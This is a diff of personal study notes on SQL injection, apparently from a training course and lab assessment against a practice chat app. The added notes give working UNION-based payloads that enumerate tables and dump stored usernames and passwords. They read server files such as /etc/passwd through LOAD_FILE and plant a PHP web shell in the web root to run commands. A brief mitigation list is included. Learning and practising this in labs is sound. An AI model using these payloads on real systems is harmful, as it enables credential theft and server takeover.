@@ -27,7 +27,7 @@
 **In-band:**
 - Output of the new query is printed to the front end, making it easier to debug if our query works.
 
-- **Union Based**: We may have to spesify where the query output is to be printed. 
+- **Union Based**: We may have to spesify where the query output is to be printed.  -> This is the only type explored in this module 
 - **Error based**: When we can get the SQL errors in the front-end, so we can intentionally create queries that generate errors. 
 
 **Blind:**
@@ -38,7 +38,6 @@
 
 **Out-of-band:**
 - Cannot get direct access to query output, whatsoever, so have to be creative to evaluate the response of our modified query, example direct output to a remote location. 
-
 
 #####  SQLi examples
 
@@ -149,7 +148,7 @@ Things we are interested in:
 - Can us example: `SELECT LOAD_FILE('/etc/passwd');` to read files 
 
 ```
-' UNION SELECT 1, LOAD_FILE('/var/www/html/config.php'), 3, 4#
+' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4#
 ```
 
 ```sql
@@ -157,16 +156,149 @@ Things we are interested in:
 ```
 
 **Writing files**
+**Conditions to write to files in MySQL:**
+1. User with `FILE` privilege enabled
+
 ```sql
 SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
-Example of checking file write permissions:
 ```sql
-' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
 ```
+
+If the value of  SECURE_FILE_PRIV is empty, we can read/write to any location. 
+
+2. MySQL global `secure_file_priv` variable not enabled
+3. Write access to the location we want to write to on the back-end server
 
 Taking a select query and writing the output to a file:
 ```sql
 SELECT * from users INTO OUTFILE '/tmp/credentials';
+```
+
+**One of the main ways to exploit sqli-writing-to-files, is to write a webshell into the web root(base web directory for the web server).**
+
+**Basic php webshell:**
+```php
+<?php system($_REQUEST[0]); ?>
+```
+
+Injecting the shell into a file via a sqli ex.
+```sql
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+```
+
+We can then access the shell via:
+```
+http://SERVER_IP:PORT/shell.php?0=id
+```
+
+NOTE: 
+To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
+
+
+#### Mitigating SQL injection:
+
+- Sanitize the characters that gets sent into a input field: `;,:'"?/&` etc
+- User that sends queries to the database has minimal permissions 
+- Web application firewall (WAF) - to detect malicious input and reject any HTTP containing them 
+
+
+#### Assessment:
+```
+admin' AND 1=1 -- -
+admin' AND 1=2 -- - 
+admin" AND 1=1 -- - 
+admin" AND 1=2 -- - 
+
+```
+
+```
+' ORDER BY 1 -- -
+' ORDER BY 2 -- -
+' ORDER BY 3 -- -
+' ORDER BY 4 -- -
+' ORDER BY 5 -- -
+```
+
+invoke key payload:
+`AAAA-AAAA-1111') OR 1=1-- —`
+
+We should get a response that the have successfully created a user. 
+
+For the search api:
+- We see that a normal search gives us 200, but if we try: `abc'` then it responds with http 500
+- So we assume there is sqli here. 
+- doing `') ORDER BY 1-- -` ... `') ORDER BY 5-- -` we can confirm that we are dealing with a sql query fetching 4 columns. (because order by 5 gave error and 1-4 did not).
+- Then we do a `') UNION SELECT 1,2,3,4#` to see how the 4 columns are used and if any shows on screen -> We see 3 and 4 shows up in the message log. 
+
+Now we have a reliable way to executing sql code and displaying them on screen, we look for some basics:
+- DB version: 10.11.11-MariaDB-0+deb12u1 - @@version
+- Schema_name: chattr - `' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA#`
+- Tabel_name: Messages
+- databasename: chattr 
+```sql
+') UNION select 1,2,TABLE_NAME,database() from INFORMATION_SCHEMA.TABLES where table_schema='chattr'#
+```
+
+Columns:
+- MessageID
+- FromID
+- ToID
+- Message
+- SentTime
+```sql
+') UNION select 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Messages'#
+```
+
+All tables:
+- Users
+- InvitationCodes
+- Messages
+```sql
+') UNION SELECT 1,2,TABLE_NAME,4  
+FROM INFORMATION_SCHEMA.TABLES  
+WHERE TABLE_SCHEMA = database()#
+```
+
+All tables of Users table:
+- UserID 
+- Username
+- Password
+- InvitationCode
+- AccountCreated
+
+```
+') UNION select 1,2,COLUMN_NAME,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='Users'#
+```
+
+
+Dump the creds from the user table:
+```
+') UNION select 1,2,Password,Username from Users#
+```
+
+
+We can also read files via sqli:
+```sql
+') UNION SELECT 1,2, LOAD_FILE('/etc/nginx/sites-enabled/default'), 4#
+```
+- We find the web root folder: root /var/www/chattr-prod 
+
+
+We should also be able to write to files:
+```sql
+') UNION SELECT 1,2,variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"#
+```
+(Shows SECURE_FILE_PRIV and empty)
+
+
+We know all we need to upload a webshell to the web root folder, and from here we find the flag:
+```
+') union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/chattr-prod/shell.php'-- -
+```
+
+```
+/shell.php?0=cd ../../..;cat flag_876a4c.txt
 ```
